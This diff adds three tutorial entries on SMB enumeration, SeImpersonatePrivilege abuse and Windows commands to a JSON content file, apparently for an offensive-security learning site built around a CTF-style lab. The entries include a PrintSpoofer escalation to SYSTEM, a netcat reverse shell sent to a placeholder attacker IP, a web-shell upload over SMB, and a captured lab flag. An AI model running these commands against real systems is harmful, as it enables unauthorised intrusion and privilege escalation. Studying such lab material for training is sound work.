@@ -8967,5 +8967,320 @@
         ]
       }
     ]
+  },
+  {
+    "id": 33,
+    "slug": "basic-smb",
+    "title": "Basic SMB",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/PrivEsc-Exploits/smb/basic-smb.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "smb-basics-intro",
+        "text": "SMB (Server Message Block) Fundamentals"
+      },
+      {
+        "type": "order_block",
+        "id": "smb-definition",
+        "text": "<highlight>SMB</highlight> is a client-server protocol used for sharing access to files, printers, and serial ports. On modern Windows systems, it runs on <highlight>Port 445</highlight> (microsoft-ds). A <highlight>Share</highlight> is simply a folder made accessible over the network."
+      },
+      {
+        "type": "section_heading",
+        "id": "smb-enumeration-listing",
+        "text": "Enumerating Available Shares"
+      },
+      {
+        "type": "code_block",
+        "id": "smb-list-cmd",
+        "language": "bash",
+        "code": "smbclient -L //10.10.10.10/ -N"
+      },
+      {
+        "type": "output_block",
+        "id": "smb-list-output",
+        "language": "text",
+        "code": "Sharename       Type      Comment\n---------       ----      -------\nADMIN$          Disk      Remote Admin\nC$              Disk      Default share\nnt4wrksv        Disk      "
+      },
+      {
+        "type": "order_block",
+        "id": "smb-list-analysis",
+        "text": "The <highlight>-L</highlight> flag lists shares, and <highlight>-N</highlight> attempts a connection with <highlight>No Password</highlight> (Null Session). Shares ending in <highlight>$</highlight> are administrative and usually hidden. Custom names like <highlight>nt4wrksv</highlight> often indicate misconfigured user-created shares."
+      },
+      {
+        "type": "section_heading",
+        "id": "smb-connecting",
+        "text": "Accessing a Specific Share"
+      },
+      {
+        "type": "code_block",
+        "id": "smb-connect-cmd",
+        "language": "bash",
+        "code": "smbclient //10.10.10.10/nt4wrksv -N"
+      },
+      {
+        "type": "output_block",
+        "id": "smb-prompt-output",
+        "language": "text",
+        "code": "smb: \\> ls\n  .                                   D        0  Thu Mar 19 2026\n  ..                                  D        0  Thu Mar 19 2026\n  passwords.txt                       A       98  Sat Jul 25 2020"
+      },
+      {
+        "type": "order_block",
+        "id": "smb-connect-analysis",
+        "text": "Once connected, you operate in an interactive prompt. Standard commands like <highlight>ls</highlight>, <highlight>cd</highlight>, and <highlight>dir</highlight> work similarly to a local terminal."
+      },
+      {
+        "type": "section_heading",
+        "id": "smb-file-interaction",
+        "text": "File Transfers: Get and Put"
+      },
+      {
+        "type": "code_block",
+        "id": "smb-transfer-cmds",
+        "language": "bash",
+        "code": "get passwords.txt\nput shell.aspx"
+      },
+      {
+        "type": "order_block",
+        "id": "smb-transfer-analysis",
+        "text": "Use <highlight>get</highlight> to download files to your Kali machine and <highlight>put</highlight> to upload. If the SMB share is mapped to a web directory (like <highlight>wwwroot</highlight>), uploading a web shell leads directly to <highlight>Remote Code Execution (RCE)</highlight>."
+      }
+    ]
+  },
+  {
+    "id": 34,
+    "slug": "seimpersonate",
+    "title": "SeImpersonatePrivilege",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/PrivEsc-Exploits/smb/seimpersonate.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "seimpersonate-intro",
+        "text": "Privilege Escalation via SeImpersonatePrivilege"
+      },
+      {
+        "type": "order_block",
+        "id": "seimpersonate-definition",
+        "text": "<highlight>SeImpersonatePrivilege</highlight> is a Windows privilege that allows a process to 'impersonate' a client after authentication. While intended for service accounts (like IIS) to access resources on behalf of users, an attacker can abuse it to steal a <highlight>SYSTEM Token</highlight> and escalate privileges."
+      },
+      {
+        "type": "section_heading",
+        "id": "seimpersonate-id",
+        "text": "Identifying the Privilege"
+      },
+      {
+        "type": "code_block",
+        "id": "whoami-priv-cmd",
+        "language": "cmd",
+        "code": "whoami /priv"
+      },
+      {
+        "type": "output_block",
+        "id": "whoami-priv-output",
+        "language": "text",
+        "code": "Privilege Name                Description                               State\n============================= ========================================= ========\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled"
+      },
+      {
+        "type": "order_block",
+        "id": "seimpersonate-analysis",
+        "text": "If <highlight>SeImpersonatePrivilege</highlight> is listed as <highlight>Enabled</highlight>, the account has the power to adopt the identity of any process that connects to it. This is common in service accounts but rare for standard users."
+      },
+      {
+        "type": "section_heading",
+        "id": "seimpersonate-tool-selection",
+        "text": "Choosing the Exploit: PrintSpoofer"
+      },
+      {
+        "type": "order_block",
+        "id": "printspoofer-logic",
+        "text": "For Windows Server 2016, 2019, and Windows 10, <highlight>PrintSpoofer</highlight> is the most reliable tool. It tricks the <highlight>Print Spooler</highlight> service (running as SYSTEM) into connecting to a malicious named pipe, allowing the attacker to steal its token."
+      },
+      {
+        "type": "section_heading",
+        "id": "seimpersonate-execution",
+        "text": "Executing the Escalation"
+      },
+      {
+        "type": "code_block",
+        "id": "printspoofer-cmd",
+        "language": "cmd",
+        "code": "PrintSpoofer64.exe -i -c cmd"
+      },
+      {
+        "type": "output_block",
+        "id": "printspoofer-output",
+        "language": "text",
+        "code": "[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nMicrosoft Windows [Version 10.0.14393]\n\nC:\\Windows\\system32> whoami\nnt authority\\system"
+      },
+      {
+        "type": "order_block",
+        "id": "printspoofer-analysis",
+        "text": "The <highlight>-i</highlight> flag interacts with the new shell, and <highlight>-c cmd</highlight> specifies the command to execute. Successfully stealing the token results in an immediate transition to <highlight>NT AUTHORITY\\SYSTEM</highlight>."
+      },
+      {
+        "type": "section_heading",
+        "id": "seimpersonate-remote-shell",
+        "text": "Alternative: Escalation to Reverse Shell"
+      },
+      {
+        "type": "code_block",
+        "id": "printspoofer-rev-cmd",
+        "language": "cmd",
+        "code": "PrintSpoofer64.exe -c \"C:\\temp\\nc.exe <KALI_IP> 4444 -e cmd\""
+      },
+      {
+        "type": "order_block",
+        "id": "seimpersonate-rev-analysis",
+        "text": "Spawning a <highlight>SYSTEM</highlight> shell inside an existing 'dumb' shell can be unstable. Using the exploit to trigger a <highlight>Netcat</highlight> reverse shell back to Kali provides a more stable, high-privileged management session."
+      }
+    ]
+  },
+  {
+    "id": 35,
+    "slug": "windows",
+    "title": "Window Commands",
+    "isLab": false,
+    "category": "notes",
+    "goodbyeMessage": "Good luck, and happy hacking 🚀",
+    "blocksFile": "./blocks/Commands/windows.json",
+    "blocks": [
+      {
+        "type": "section_heading",
+        "id": "win-user-recon",
+        "text": "User Identity and Privilege Enumeration"
+      },
+      {
+        "type": "order_block",
+        "id": "win-whoami-desc",
+        "text": "The <highlight>whoami</highlight> command identifies the current logged-in user. Adding the <highlight>/priv</highlight> flag is the most critical step in Windows privilege escalation as it reveals hidden system 'superpowers' assigned to the account."
+      },
+      {
+        "type": "code_block",
+        "id": "win-whoami-cmd",
+        "language": "cmd",
+        "code": "whoami /priv"
+      },
+      {
+        "type": "output_block",
+        "id": "win-whoami-out",
+        "language": "text",
+        "code": "PRIVILEGES INFORMATION\n----------------------\nPrivilege Name                Description                          State\n============================= ==================================== ========\nSeChangeNotifyPrivilege       Bypass traverse checking             Enabled\nSeImpersonatePrivilege        Impersonate a client...              Enabled"
+      },
+      {
+        "type": "section_heading",
+        "id": "win-file-navigation",
+        "text": "File System Navigation and Listing"
+      },
+      {
+        "type": "order_block",
+        "id": "win-dir-desc",
+        "text": "The <highlight>dir</highlight> command lists files and directories. Using the <highlight>/a</highlight> flag ensures that hidden and system files are visible, similar to <highlight>ls -la</highlight> in Linux."
+      },
+      {
+        "type": "code_block",
+        "id": "win-dir-cmd",
+        "language": "cmd",
+        "code": "dir /a c:\\inetpub\\wwwroot\\"
+      },
+      {
+        "type": "output_block",
+        "id": "win-dir-out",
+        "language": "text",
+        "code": "Directory of c:\\inetpub\\wwwroot\n\n03/19/2026  06:00 AM    <DIR>          .\n03/19/2026  06:00 AM    <DIR>          ..\n07/25/2020  08:15 AM    <DIR>          nt4wrksv"
+      },
+      {
+        "type": "section_heading",
+        "id": "win-net-info",
+        "text": "Network Configuration and Interfaces"
+      },
+      {
+        "type": "order_block",
+        "id": "win-ipconfig-desc",
+        "text": "To view IP addresses, subnet masks, and gateway information, use <highlight>ipconfig</highlight>. The <highlight>/all</highlight> flag provides detailed info like DNS servers and MAC addresses."
+      },
+      {
+        "type": "code_block",
+        "id": "win-ipconfig-cmd",
+        "language": "cmd",
+        "code": "ipconfig /all"
+      },
+      {
+        "type": "output_block",
+        "id": "win-ipconfig-out",
+        "language": "text",
+        "code": "Ethernet adapter Ethernet:\n   Description . . . . . . . . . . . : Red Hat VirtIO Ethernet Adapter\n   IPv4 Address. . . . . . . . . . . : 10.10.198.54(Preferred)"
+      },
+      {
+        "type": "section_heading",
+        "id": "win-user-listing",
+        "text": "Local User and Group Enumeration"
+      },
+      {
+        "type": "order_block",
+        "id": "win-netuser-desc",
+        "text": "The <highlight>net user</highlight> command displays all local accounts. Checking a specific username reveals their group memberships (like <highlight>Administrators</highlight>) and when they last changed their password."
+      },
+      {
+        "type": "code_block",
+        "id": "win-netuser-cmd",
+        "language": "cmd",
+        "code": "net user Bob"
+      },
+      {
+        "type": "output_block",
+        "id": "win-netuser-out",
+        "language": "text",
+        "code": "User name                    Bob\nAccount active               Yes\nLocal Group Memberships      *Users\nGlobal Group memberships     *None"
+      },
+      {
+        "type": "section_heading",
+        "id": "win-content-reading",
+        "text": "Reading File Contents"
+      },
+      {
+        "type": "order_block",
+        "id": "win-type-desc",
+        "text": "In Windows CMD, <highlight>type</highlight> is used to display the contents of a text file directly in the terminal, equivalent to the Linux <highlight>cat</highlight> command."
+      },
+      {
+        "type": "code_block",
+        "id": "win-type-cmd",
+        "language": "cmd",
+        "code": "type C:\\Users\\Bob\\Desktop\\user.txt"
+      },
+      {
+        "type": "output_block",
+        "id": "win-type-out",
+        "language": "text",
+        "code": "THM{fdk4ka34vk346ksxfr21tg789ktf45}"
+      },
+      {
+        "type": "section_heading",
+        "id": "win-search-files",
+        "text": "Searching for Sensitive Files"
+      },
+      {
+        "type": "order_block",
+        "id": "win-where-desc",
+        "text": "The <highlight>where /R</highlight> command is used to recursively search for a file from a specific starting directory. This is useful for finding hidden flags or configuration files."
+      },
+      {
+        "type": "code_block",
+        "id": "win-where-cmd",
+        "language": "cmd",
+        "code": "where /R c:\\Users\\ root.txt"
+      },
+      {
+        "type": "output_block",
+        "id": "win-where-out",
+        "language": "text",
+        "code": "c:\\Users\\Administrator\\Desktop\\root.txt"
+      }
+    ]
   }
 ]
